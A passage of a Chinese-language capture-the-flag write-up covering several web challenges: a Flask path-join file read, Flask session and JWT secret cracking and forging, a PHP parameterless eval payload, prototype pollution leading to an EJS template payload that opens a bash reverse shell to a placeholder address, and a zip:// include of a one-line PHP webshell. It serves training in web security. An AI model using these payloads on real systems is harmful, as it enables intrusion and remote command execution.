content</span>):</span><br><span class="line">        self.article_id = article_id</span><br><span class="line">        self.title = title</span><br><span class="line">        self.content = content</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_article_id</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, articles=articles)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        title = request.form[<span class="string">&#x27;title&#x27;</span>]</span><br><span class="line">        content = request.form[<span class="string">&#x27;content&#x27;</span>]</span><br><span class="line">        article_id = generate_article_id()</span><br><span class="line">        article = Article(article_id, title, content)</span><br><span class="line">        articles.append(article)</span><br><span class="line">        save_article(article_id, title, content)</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;upload.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/article/&lt;article_id&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">article</span>(<span class="params">article_id</span>):</span><br><span class="line">    <span class="keyword">for</span> article <span class="keyword">in</span> articles:</span><br><span class="line">        <span class="keyword">if</span> article.article_id == article_id:</span><br><span class="line">            title = article.title</span><br><span class="line">            sanitized_title = sanitize_filename(title)</span><br><span class="line">            article_path = os.path.join(ARTICLES_FOLDER, sanitized_title)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(article_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> (file):</span><br><span class="line">                content = file.read()</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;articles.html&#x27;</span>, title=sanitized_title, content=content, article_path=article_path)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;error.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save_article</span>(<span class="params">article_id, title, content</span>):</span><br><span class="line">    sanitized_title = sanitize_filename(title)</span><br><span class="line">    article_path = ARTICLES_FOLDER + <span class="string">&#x27;/&#x27;</span> + sanitized_title</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(article_path, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> (file):</span><br><span class="line">        file.write(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sanitize_filename</span>(<span class="params">filename</span>):</span><br><span class="line">    sensitive_chars = [<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;.&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> sensitive_chars:</span><br><span class="line">        filename = filename.replace(char, <span class="string">&#x27;_&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> filename</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨ç»å¯¹è·¯å¾„æ‹¼æ¥æ¼æ´ï¼š</p><blockquote><p>os.path.join(path,*paths)å‡½æ•°ç”¨äºå°†å¤šä¸ªæ–‡ä»¶è·¯å¾„è¿æ¥æˆä¸€ä¸ªç»„åˆçš„è·¯å¾„ã€‚ç¬¬ä¸€ä¸ªå‡½æ•°é€šå¸¸åŒ…å«äº†åŸºç¡€è·¯å¾„ï¼Œè€Œä¹‹åçš„æ¯ä¸ªå‚æ•°è¢«å½“ä½œç»„ä»¶æ‹¼æ¥åˆ°åŸºç¡€è·¯å¾„ä¹‹åã€‚<br>ç„¶è€Œï¼Œè¿™ä¸ªå‡½æ•°æœ‰ä¸€ä¸ªå°‘æœ‰äººçŸ¥çš„ç‰¹æ€§ï¼Œå¦‚æœæ‹¼æ¥çš„æŸä¸ªè·¯å¾„ä»¥ / å¼€å¤´ï¼Œé‚£ä¹ˆåŒ…æ‹¬åŸºç¡€è·¯å¾„åœ¨å†…çš„æ‰€æœ‰å‰ç¼€è·¯å¾„éƒ½å°†è¢«åˆ é™¤ï¼Œè¯¥è·¯å¾„å°†è§†ä¸ºç»å¯¹è·¯å¾„ã€‚</p></blockquote><p><code>os.path.join(&#39;articles/&#39;,&#39;/f14444&#39;)=&#39;/f14444&#39;</code></p><p>æ•…åœ¨ <code>/upload</code> è·¯ç”±ï¼ŒPOST <code>title=/f14444&amp;content=qwe</code>ï¼Œå³å¯æ‹¿åˆ°flagã€‚</p><p>â€‹</p><h3 id="you-konw-flask"><a href="#you-konw-flask" class="headerlink" title="you konw flask?"></a>you konw flask?</h3><blockquote><p>åœ¨é©¾æ ¡ä½ ä¸é«˜ä½å¾—å½“ä¸ªæ•™ç»ƒï¼Ÿ</p></blockquote><p>æ‰«æå‡º <code>robots.txt</code>ï¼Œæ³„éœ²ä¿¡æ¯ï¼š<code>3ysd8.html</code>ï¼Œæºç é‡Œæœ‰æ³¨é‡Šï¼š</p><p><code>&lt;!-- keyæ˜¯ app.secret_key = &#39;wanbao&#39;+base64.b64encode(str(random.randint(1, 100)).encode(&#39;utf-8&#39;)).decode(&#39;utf-8&#39;)+&#39;wanbao&#39; (www,æˆ‘å¯çˆ±çš„è€å®,æˆ‘å­˜çš„å¤Ÿå®‰å…¨çš„å§) --&gt;</code></p><p>åˆ¶ä½œçˆ†ç ´secret_keyçš„å­—å…¸ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">g = <span class="built_in">open</span>(<span class="string">&#x27;dict.txt&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    key = <span class="string">b&#x27;wanbao&#x27;</span>+base64.b64encode(<span class="built_in">str</span>(i).encode())+<span class="string">b&#x27;wanbao&#x27;</span></span><br><span class="line">    g.write(key)</span><br><span class="line">    g.write(<span class="string">b&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>çˆ†ç ´flask sessionçš„secret_keyï¼š</p><p><code>flask-unsign --unsign --cookie &#39;eyJpc19hZG1pbiI6ZmFsc2UsIm5hbWUiOiJ4eHgiLCJ1c2VyX2lkIjozfQ.ZUOYig.x1sFiE5HRT9q5bGAwSF6wMnZfOM&#39; --wordlist dict.txt</code></p><p>å¾—åˆ°secret_keyåï¼Œä¼ªé€ adminçš„flask sessionï¼š</p><p><code>flask-unsign --sign --cookie &quot;&#123;&#39;is_admin&#39;: True, &#39;name&#39;: &#39;xxx&#39;, &#39;user_id&#39;: 3&#125;&quot; --secret &#39;wanbaoNTc=wanbao&#39;</code></p><p>è¿›å…¥å­¦å‘˜ç®¡ç†é¡µé¢ï¼Œæ‰¾åˆ°flagï¼š</p><p><code>æ—¢ç„¶ä½ æ˜¯æ•™ç»ƒï¼Œé‚£è¿™ä¸ªflagå­¦å‘˜å°±äº¤ç»™ä½ å§ SYC&#123;naCcuTYu2mu0c33Fen&#125;</code></p><p>â€‹</p><h3 id="Pupyy-rce"><a href="#Pupyy-rce" class="headerlink" title="Pupyy_rce"></a>Pupyy_rce</h3><blockquote><p>è¿™æ˜¯ä»€ä¹ˆï¼Ÿæ‰§è¡Œä¸€ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(flag.php);</span><br><span class="line"><span class="comment">//å½“å‰ç›®å½•ä¸‹æœ‰å¥½åº·çš„ğŸ˜‹</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$var</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>];</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/env|var|session|header/i&quot;</span>, <span class="variable">$var</span>,<span class="variable">$match</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$var</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&quot;WAF!!&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;PLZ DONT HCAK MEğŸ˜…&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>æ— å‚æ•°RCEï¼š<code>?var=print_r(scandir(current(localeconv())));</code></p><p>å¾—åˆ°ï¼š</p><p><code>Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; error.log [3] =&gt; fl@g.php [4] =&gt; genshin01.txt [5] =&gt; index.php [6] =&gt; tiangou01.txt [7] =&gt; tiangou02.txt )</code></p><p>è®¿é—® <code>fl@g.php</code> å¾—flagã€‚</p><p>â€‹</p><h3 id="é›¨"><a href="#é›¨" class="headerlink" title="é›¨"></a>é›¨</h3><blockquote><p>VanZYç»™ç™½æœˆå…‰å†™äº†ä¸€å¼ æ˜ä¿¡ç‰‡ï¼Œå¿«å»å¸®ä»–æŠŠidç­¾ä¸Šå§</p></blockquote><p>è®¿é—® <code>/source</code> æ²¡æƒé™ï¼Œæç¤º <code>&lt;!--Maybe you can view /hint--&gt;</code>ã€‚</p><p>è®¿é—® <code>/hint</code>ï¼Œæç¤º <code>I heard that the challenge maker likes to use his own id as secret_key</code>ã€‚</p><p>ä½¿ç”¨<a target="_blank" rel="noopener" href="https://jwt.io/">jwt.io</a>è§£æjwtï¼Œè®¾ç½®secret_key=VanZYï¼Œå¾—åˆ° <code>/source</code> æºç ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> jwt_secret = <span class="string">&quot;VanZY&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> cookieParser = <span class="built_in">require</span>(<span class="string">&#x27;cookie-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> putil_merge = <span class="built_in">require</span>(<span class="string">&quot;putil-merge&quot;</span>)</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, <span class="string">&#x27;./views&#x27;</span>);</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>());</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123;<span class="attr">extended</span>: <span class="literal">true</span>&#125;)).<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>())</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Super</span> = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> safecode = <span class="keyword">function</span> (<span class="params">code</span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> validInput = <span class="regexp">/global|mainModule|import|constructor|read|write|_load|exec|spawnSync|stdout|eval|stdout|Function|setInterval|setTimeout|var|\+|\*/ig</span>;</span><br><span class="line">    <span class="keyword">return</span> !validInput.<span class="title function_">test</span>(code);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">all</span>(<span class="string">&#x27;/code&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">method</span> == <span class="string">&quot;POST&quot;</span> &amp;&amp; req.<span class="property">body</span>) &#123;</span><br><span class="line">    <span class="title function_">putil_merge</span>(&#123;&#125;, req.<span class="property">body</span>, &#123;<span class="attr">deep</span>:<span class="literal">true</span>&#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="title function_">send</span>(<span class="string">&quot;welcome to code&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">all</span>(<span class="string">&#x27;/hint&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&quot;I heard that the challenge maker likes to use his own id as secret_key&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/source&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> auth = req.<span class="property">cookies</span>.<span class="property">auth</span>;</span><br><span class="line">  jwt.<span class="title function_">verify</span>(auth, jwt_secret , <span class="keyword">function</span>(<span class="params">err, decoded</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(decoded.<span class="property">user</span>===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        res.<span class="title function_">sendFile</span>(path.<span class="title function_">join</span>(__dirname + <span class="string">&#x27;/index.js&#x27;</span>));</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;you are not admin    &lt;!--Maybe you can view /hint--&gt;&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>&#123;</span><br><span class="line">      res.<span class="title function_">send</span>(<span class="string">&quot;Fuck you Hacker!!!&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">all</span>(<span class="string">&#x27;/create&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!req.<span class="property">body</span>.<span class="property">name</span> || req.<span class="property">body</span>.<span class="property">name</span> === <span class="literal">undefined</span> || req.<span class="property">body</span>.<span class="property">name</span> === <span class="literal">null</span>)&#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&quot;please input name&quot;</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title class_">Super</span>[<span class="string">&#x27;userrole&#x27;</span>] === <span class="string">&#x27;Superadmin&#x27;</span>) &#123;</span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, req.<span class="property">body</span>);</span><br><span class="line">      &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_">safecode</span>(req.<span class="property">body</span>.<span class="property">name</span>)) &#123;</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&quot;ä½ åœ¨åšä»€ä¹ˆï¼Ÿå¿«åœä¸‹ï¼ï¼ï¼&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123;<span class="attr">name</span>: req.<span class="property">body</span>.<span class="property">name</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>,<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> token = jwt.<span class="title function_">sign</span>(&#123;<span class="string">&#x27;user&#x27;</span>:<span class="string">&#x27;guest&#x27;</span>&#125;,jwt_secret,&#123; <span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span> &#125;);</span><br><span class="line">    res.<span class="title function_">cookie</span>(<span class="string">&#x27;auth &#x27;</span>,token);</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&#x27;Only admin can get source in /source&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Server started on port 3000&#x27;</span>));</span><br></pre></td></tr></table></figure><p>åœ¨ <code>/code</code> è·¯ç”±ä¸­ä½¿ç”¨äº† <code>putil_merge()</code> ï¼Œç»“åˆputil-mergeåŸå‹é“¾æ±¡æŸ“æ¼æ´ï¼ˆCVE-2021-23470ï¼‰ï¼Œå°† <code>Super</code> æ±¡æŸ“ï¼Œä½¿å¾— <code>/create</code> è·¯ç”±å†…çš„ <code>Super[&#39;userrole&#39;] === &#39;Superadmin&#39;</code> æˆç«‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /code</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;userrole&quot;:&quot;Superadmin&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>è¿›å…¥ <code>/create</code> è·¯ç”±å†…ï¼Œæ‰“ejs RCEï¼ˆCVE-2022-29078ï¼‰ï¼Œå‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://inhann.top/2023/03/26/ejs/">ejs RCE CVE-2022-29078 bypass</a>ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /create HTTP/1.1</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;xxx&quot;,</span><br><span class="line">  &quot;settings&quot;:&#123;</span><br><span class="line">    &quot;view options&quot;:&#123;</span><br><span class="line">      &quot;escapeFunction&quot;:&quot;console.log;this.global.process.mainModule.require(\&quot;child_process\&quot;).execSync(\&quot;bash -c \\\&quot;bash -i &gt; /dev/tcp/x.x.x.x/7777 0&gt;&amp;1 2&gt;&amp;1\\\&quot;\&quot;);&quot;,</span><br><span class="line">      &quot;client&quot;:&quot;true&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åå¼¹shellï¼Œåœ¨VPS getshellï¼Œ<code>cat /Yupr0m1sing_f1ll4agggXD</code> å¾—åˆ°flagï¼š<code>SYC&#123;Chun_a1_M4n_NeVer_G1ve_Up&#125;</code>ã€‚</p><p>â€‹</p><h3 id="famale-imp-l0ve"><a href="#famale-imp-l0ve" class="headerlink" title="famale_imp_l0ve"></a>famale_imp_l0ve</h3><blockquote><p>â€é›Œå°é¬¼çœ‹äº†ä¸‹o2takuXXå¸ˆå‚…çš„é©¬å­è¯´:â€å‘~å°±..å°±æ€ä¹ˆé•¿å—ï¼ŒçœŸæ˜¯æ‚é±¼å‘¢~â¤â€,ä½ èƒ½æ¥å¸®å¸®ä»–å—ï¼Ÿ</p></blockquote><p>æ ¹æ®æºç æ³¨é‡Šï¼Œå­˜åœ¨ <code>include.php</code> æ–‡ä»¶ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//o2takuXXå¸ˆå‚…è¯´æœ‰é—®é¢˜ï¼Œå¿˜çœ‹äº†ã€‚</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$file</span>, -<span class="number">4</span>)) == <span class="string">&quot;.jpg&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç»“åˆé¦–é¡µæ–‡ä»¶ä¸Šä¼ å’Œå‹ç¼©çš„æç¤ºï¼Œè€ƒå¯Ÿzipæ–‡ä»¶åŒ…å«ã€‚</p><p>é¦–å…ˆæ–°å»ºä¸€ä¸ªzipæ–‡ä»¶ï¼Œé‡Œé¢å‹ç¼©ç€ä¸€ä¸ªä»£ç ä¸º <code>&lt;?php system($_GET[x]);</code> çš„PHPè„šæœ¬ï¼›ç„¶åæ„é€  <code>zip://php.zip#php.jpg</code>ï¼š</p><p><code>/include.php?file=zip://php.zip%23php.jpg&amp;x=cat /flag</code></p><p>å³å¯å¾—åˆ°flagã€‚</p><p>â€‹</p><h3 id="change-it"><a href="#change-it" class="headerlink" title="change_it"></a>change_it</h3><blockquote><p>å¿«æ¥æ‰¾flagï¼ï¼ˆæ–‡ä»¶ä¸Šä¼ çš„ç›®å½•ä¸º â€œ/uploadâ€ï¼‰</p></blockquote><p>æŸ¥çœ‹æºä»£ç å¾—åˆ°ç”¨æˆ·åå¯†ç  <code>user/user</code>ï¼Œå…¶ä¸­æœ‰ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- ä¸€ç›´è¿ä¸ä¸Šï¼Ÿè¿ä¸ä¸Šå°±å¯¹å•¦ï¼ --&gt;</span><br><span class="line"> &lt;!-- </span><br><span class="line">   phpç‰ˆæœ¬ä¸º8.0</span><br><span class="line"> function php_mt_seed($seed)</span><br><span class="line">       &#123;</span><br><span class="line">           mt_srand($seed);</span><br><span class="line">       &#125;</span><br><span class="line">       $seed = time();</span><br><span class="line">       php_mt_seed($seed);</span><br><span class="line">       $characters = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;;</span><br><span class="line"></span><br><span class="line">       $newFileName = &#x27;&#x27;;</span><br><span class="line">       for ($i = 0; $i &lt; 10; $i++) &#123;</span><br><span class="line">           $newFileName .= $characters[mt_rand(0, strlen($characters) - 1)];</span><br><span class="line">       &#125;</span><br><span class="line"> </span><br><span class="line"> --&gt;</span><br></pre></td></tr></table></figure><p>jwtä¼ªé€ ï¼Œçˆ†ç ´c-jwt-crackerï¼š</p><p><code>./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJRaW5nd2FuIiwibmFtZSI6InVzZXIiLCJhZG1pbiI6ImZhbHNlIn0.gzCFCz2Hw5c_EIjcM2lQ2QL3aDW3rAAHU2ZQ50_tnY4</code></p><p>å¾—åˆ° <code>Secret is &quot;yibao&quot;</code></p><p>æ„é€  <code>&#123;&quot;iss&quot;: &quot;Qingwan&quot;,&quot;name&quot;: &quot;admin&quot;,&quot;admin&quot;: &quot;true&quot;&#125;</code> å¯¹åº”çš„JWTï¼š</p><p><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJRaW5nd2FuIiwibmFtZSI6ImFkbWluIiwiYWRtaW4iOiJ0cnVlIn0.qs6tjnaghMXiTsvqEMUauz_JGzxxKdtaXPGVtQUEHek</code></p><p>æ ¹æ®å‰é¢ change.html æºç æ³„éœ²çš„ <code>php_mt_seed()</code> å‡½æ•°çŸ¥æ–‡ä»¶åé€šè¿‡éšæœºæ•°æ›´æ”¹ï¼ŒæŠ“åŒ…ï¼Œæ”¹æ–‡ä»¶åä¸º1.phpï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 